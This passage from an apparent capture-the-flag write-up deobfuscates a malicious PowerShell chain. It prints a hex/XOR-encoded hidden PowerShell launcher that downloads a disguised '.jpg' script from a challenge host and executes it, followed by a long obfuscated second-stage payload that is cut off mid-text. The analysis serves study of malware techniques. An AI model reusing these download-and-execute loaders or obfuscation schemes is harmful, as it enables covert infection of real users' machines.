=<span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input1)):</span><br><span class="line">    dec.append( input1[i] - <span class="number">601</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input2)):</span><br><span class="line">    dec.append( input2[i] - <span class="number">601</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dec)</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytearray(b&quot;powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches(\&#x27;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fffef8fce3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7\&#x27;,\&#x27;.&#123;2&#125;\&#x27;) | % &#123; [char]([Convert]::ToByte($_.Value,16) -bxor \&#x27;204\&#x27;) &#125;) -join \&#x27;\&#x27;;&amp; $EFTE.Substring(0,3) $EFTE.Substring(3)WScript.Shell&quot;)</span><br></pre></td></tr></table></figure><p>from hex ç„¶å xor 204<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iexStart-Process &quot;$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot; -WindowStyle Hidden -ArgumentList &#x27;-w&#x27;,&#x27;h&#x27;,&#x27;-ep&#x27;,&#x27;Unrestricted&#x27;,&#x27;-Command&#x27;,&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:48105/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;;</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &#x27;http://challenge.xinshi.fun:45468/bestudding.jpg&#x27; -o payload2.txt</span><br></pre></td></tr></table></figure><br>payload2:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;(&#x27;  | % &#123; $r = + $() &#125; &#123; $u = $r &#125; &#123; $b = ++  $r &#125; &#123; $q = (  $r = $r + $b  ) &#125; &#123; $z = (  $r = $r + $b  ) &#125; &#123; $o = ($r = $r + $b  ) &#125; &#123; $d = ($r = $r + $b  ) &#125; &#123; $h = ($r = $r + $b  ) &#125; &#123; $e = ($r = $r + $b  ) &#125; &#123; $i = ($r = $r + $b  ) &#125; &#123; $x = ($q *( $z) ) &#125; &#123; $l = ($r = $r + $b) &#125; &#123; $g = &quot;[&quot; + &quot;$(@&#123;  &#125;)&quot;[$e  ] + &quot;$(@&#123;  &#125;)&quot;[  &quot;$b$l&quot;  ] + &quot;$(@&#123;  &#125;  )  &quot;[  &quot;$q$u&quot;  ] + &quot;$?&quot;[$b  ] + &quot;]&quot; &#125; &#123; $r = &quot;&quot;.(&quot;$(  @&#123;&#125;  )  &quot;[  &quot;$b$o&quot;  ] + &quot;$(@&#123;&#125;)  &quot;[  &quot;$b$h&quot;] + &quot;$(  @&#123;  &#125;  )&quot;[$u] + &quot;$(@&#123;&#125;  )&quot;[$o] + &quot;$?  &quot;[  $b] + &quot;$(  @&#123;&#125;)&quot;[$z  ]) &#125; &#123; $r = &quot;$(@&#123;  &#125;  )&quot;[  &quot;$b&quot; + &quot;$o&quot;] + &quot;$(@&#123;  &#125;)  &quot;[$o  ] + &quot;$r&quot;[&quot;$q&quot; + &quot;$e&quot;  ] &#125;  )  ;  &quot; $r  ($g$z$x+$g$x$i+$g$b$u$b+$g$l$i+$g$b$b$e+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$x$l+$g$b$b$o+$g$b$b$o+$g$b$b$b+$g$b$b$o+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$x+$g$b$u$b+$g$b$b$o+$g$l$i+$g$b$b$b+$g$b$b$d+$g$b$u$b+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$e+$g$l$e+$g$b$b$o+$g$b$b$u+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$z+$g$b$u$d+$g$b$u$i+$g$b$u$b+$g$b$b$u+$g$b$b$x+$g$b$u$i+$g$b$q$b+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$u$d+$g$b$b$u+$g$b$b$e+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$b$d+$g$b$u$o+$g$b$b$e+$g$b$b$x+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$z$q+$g$o$e+$g$b$b$d+$g$z$q+$g$o$e+$g$b$b$x+$g$z$q+$g$d$o+$g$o$i+$g$o$i+$g$z$q+$g$x$q+$g$z$x+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i+$g$z$q+$g$d$u+$g$x$q+$g$z$i+$g$o$l+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$x$e+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$u$i+$g$b$b$b+$g$x$d$z$e$o+$g$o$u+$g$i$e$z$x+$g$b$i$z+$g$l$x$l+$g$x$u+$g$z$q+$g$o$b+$g$i$l$e$i+$g$l$e$z$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$b$x+$g$l$e+$g$b$b$o+$g$b$b$x+$g$i$u+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$e+$g$l$e+$g$b$b$u+$g$b$b$e+$g$l$e+$g$b$u$i+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$q+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$b$u$d+$g$b$b$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$x+$g$b$b$b+$g$b$b$o+$g$b$u$u+$g$b$u$b+$g$b$b$o+$g$i$z+$g$b$b$x+$g$b$q$b+$g$b$u$i+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$u+$g$b$u$d+$g$b$q$u+$g$b$u$b+$g$b$u$u+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$x+$g$l$e+$g$l$l+$g$b$u$e+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$d+$g$o$i+$g$o$i+$g$d$d+$g$d$d+$g$x$e+$g$x$e+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$e$u+$g$l$e+$g$b$u$i+$g$b$b$d+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$b$b+$g$b$b$q+$g$e$e+$g$b$b$b+$g$b$b$d+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$x+$g$e$z+$g$e$x+$g$x$e+$g$i$o+$g$e$u+$g$b$q$z+$g$l$i+$g$b$u$b+$g$l$d+$g$i$x+$g$b$u$d+$g$e$b+$g$b$u$i+$g$b$u$i+$g$x$d+$g$e$i+$g$i$o+$g$l$d+$g$d$q+$g$e$b+$g$d$q+$g$e$z+$g$b$b$u+$g$z$x+$g$i$o+$g$l$d+$g$i$u+$g$e$q+$g$b$u$i+$g$d$z+$g$e$q+$g$e$z+$g$e$i+$g$b$u$z+$g$b$q$d+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$i+$g$o$i+$g$b$b$q+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$d$i+$g$o$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$b$b$b+$g$b$u$i+$g$l$e+$g$b$b$d+$g$z$o+$g$o$o+$g$z$q+$g$d$o+$g$d$q+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$x$i$q$d+$g$z$e$z$q$o+$g$q$e$i$u$l+$g$q$x$z$e$e+$g$z$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$x$d$z$u$e+$g$z$x$i$q$d+$g$q$u$u$b$u+$g$z$b$z$i$z+$g$q$b$o$e$d+$g$q$x$b$d$l+$g$q$o$d$l$u+$g$q$u$u$o$u+$g$q$u$l$i$x+$g$q$l$x$b$x+$g$z$u$z$o$u+$g$q$b$x$u$q+$g$x$d$q$l$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$z$q+$g$q$z$x$u$b+$g$q$q$z$b$q+$g$z$e$u$q$e+$g$z$e$z$q$o+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$u+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$z$u$u$u$d+$g$z$z$u$o$b+$g$q$z$d$d$i+$g$q$q$z$b$q+$g$z$q+$g$o$l+$g$o$i+$g$z$q+$g$q$u$l$l$i+$g$z$i$